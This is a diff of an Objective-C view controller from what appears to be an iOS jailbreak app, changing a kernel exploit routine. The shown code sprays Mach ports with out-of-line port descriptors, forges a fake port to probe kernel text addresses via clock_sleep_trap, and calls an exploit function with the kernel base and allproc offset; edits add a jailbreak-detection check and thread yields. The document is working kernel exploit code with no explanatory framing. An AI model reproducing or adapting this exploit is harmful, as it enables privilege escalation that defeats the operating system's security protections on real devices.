@@ -13,6 +13,7 @@
 #import <pthread.h>
 #undef __IPHONE_OS_VERSION_MIN_REQUIRED
 #import <mach/mach.h>
+#include <sys/utsname.h>
 extern uint64_t procoff;
 
 typedef struct {
@@ -38,6 +39,15 @@ typedef struct {
     [super viewDidLoad];
     init_offsets();
     
+    struct utsname u = { 0 };
+    uname(&u);
+    
+    
+    if (strstr(u.version, "deviceARM128")) {
+        [_freeMe setEnabled:NO];
+        [_freeMe setTitle:@"I'm free!" forState:UIControlStateDisabled];
+
+    }
     // added this because why not?
     //shows device info from app
     //@iKilledAppl3
@@ -62,20 +72,19 @@ struct not_essers_ipc_object {
 
 
 
-#define IO_BITS_ACTIVE      0x80000000
-#define	IKOT_TASK				2
-#define IKOT_IOKIT_CONNECT      29
-#define IKOT_CLOCK              25
+#define IO_BITS_ACTIVE 0x80000000
+#define	IKOT_TASK 2
+#define IKOT_IOKIT_CONNECT 29
+#define IKOT_CLOCK 25
 
 char dt[128];
-- (IBAction)yolo:(UIButton*)sender
-{
+    
+- (IBAction)yolo:(UIButton*)sender {
     /*
      
      we out here!
      
      */
-    
     
     mach_port_t vch = 0;
     
@@ -121,7 +130,7 @@ char dt[128];
     sprz msg2;
     
     memset(&msg2, 0, sizeof(sprz));
-    msg1.msgh_body.msgh_descriptor_count = 256;
+    msg1.msgh_body.msgh_descriptor_count = 128;
     
     msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
     msg1.head.msgh_local_port = MACH_PORT_NULL;
@@ -139,17 +148,21 @@ char dt[128];
         msg1.desc[i].disposition = 19;
     }
     
+    pthread_yield_np();
     for (int i=1; i<300; i++) {
         msg1.head.msgh_remote_port = ports[i];
         kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
         assert(kret==0);
     }
+    
+    pthread_yield_np();
     for (int i=500; i<800; i++) {
         msg1.head.msgh_remote_port = ports[i];
         kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
         assert(kret==0);
     }
     
+    pthread_yield_np();
     for (int i=300; i<500; i++) {
         msg1.head.msgh_remote_port = ports[i];
         if (i%4 == 0) {
@@ -161,6 +174,7 @@ char dt[128];
         assert(kret==0);
     }
     
+    pthread_yield_np();
     for (int i = 300; i<500; i+=4) {
         msg2.head.msgh_local_port = ports[i];
         kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
@@ -213,7 +227,7 @@ foundp:
             *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
             *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
             
-            kern_return_t kret = clock_sleep_trap(foundport, 0x12345, 0, 0, NULL);
+            kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);
             
             if (kret != KERN_FAILURE) {
                 goto gotclock;
@@ -320,6 +334,9 @@ gotclock:;
     
     void exploit(void*, mach_port_t, uint64_t, uint64_t);
     exploit(sender, pt, kernel_base, allproc_offset);
+    [_freeMe setEnabled:NO];
+    [_freeMe setTitle:@"already jailbroken" forState:UIControlStateDisabled];
+    
 }
 
 - (void)didReceiveMemoryWarning {
@@ -331,6 +348,8 @@ gotclock:;
 - (void)dealloc {
     [_deviceVersionLabel release];
     [_deviceTypeLabel release];
+    [_freeMe release];
     [super dealloc];
 }
+    
 @end
